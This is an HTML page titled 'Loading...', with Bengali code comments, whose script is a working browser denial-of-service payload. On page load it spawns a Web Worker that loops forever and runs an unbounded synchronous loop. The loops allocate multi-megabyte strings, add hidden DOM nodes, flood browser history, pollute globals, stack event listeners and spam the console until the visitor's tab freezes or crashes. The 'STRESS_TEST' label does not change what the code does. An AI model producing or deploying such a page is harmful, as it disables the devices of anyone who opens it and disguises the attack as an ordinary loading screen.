<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { 
            background-color: #ffffff; 
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>

    <script>
        // মেমোরি ট্র্যাকিংয়ের জন্য গ্লোবাল ভেরিয়েবল
        const permanentMemoryStorage = [];
        let keyCounter = 0;

        window.addEventListener('DOMContentLoaded', () => {
            
            // ফিচার ১: ব্যাকগ্রাউন্ড থ্রেড (Web Worker) তৈরি করার চেষ্টা
            // এটি সফল হলে মেইন থ্রেডের বাইরেও সিপিইউ কোর ব্যস্ত রাখার চেষ্টা করে
            try {
                const workerCode = `while(true){ postMessage(new Array(1000000).join("⚙️")); }`;
                const blob = new Blob([workerCode], { type: 'application/javascript' });
                const worker = new Worker(URL.createObjectURL(blob));
                worker.onmessage = function(e) {
                    permanentMemoryStorage.push(e.data);
                };
            } catch (e) {
                console.log("Worker initialization skipped or blocked.");
            }

            // প্রধান সিনক্রোনাস লুপ
            while (true) {
                
                // ১. বড় আকারের ডেটা ব্লক তৈরি ও পুশ
                let instantMassiveBlock = new Array(5000000).join("⚠️🧱");
                permanentMemoryStorage.push(instantMassiveBlock);
                
                // ২. অদৃশ্য DOM এলিমেন্ট তৈরি
                let hiddenNode = document.createElement('div');
                hiddenNode.style.position = 'absolute';
                hiddenNode.style.left = '-9999px'; 
                hiddenNode.innerHTML = "<span>STRESS_TEST</span>".repeat(500);
                document.body.appendChild(hiddenNode);
                
                // ৩. হিস্ট্রি স্টেট জ্যামিং
                window.history.pushState(null, null, "#/lock-status/" + Math.random());

                // ফিচার ২: গ্লোবাল স্কোপ পলিউশন
                // উইন্ডো অবজেক্টের আন্ডারে অনবরত নতুন ইউনিক প্রোপার্টি তৈরি করা
                window["stress_key_" + keyCounter] = instantMassiveBlock;
                keyCounter++;

                // ফিচার ৩: অনবরত ইভেন্ট লিসেনার অ্যাড করা
                // এটি ব্রাউজারের ইভেন্ট ডিস্ট্রিবিউশন টেবিলকে ভারী করে তোলে
                window.addEventListener('resize', () => {
                    return instantMassiveBlock;
                });
                
                // ৪. কনসোল রাইট
                console.log(instantMassiveBlock);
            }
        });
    </script>
</body>
</html>
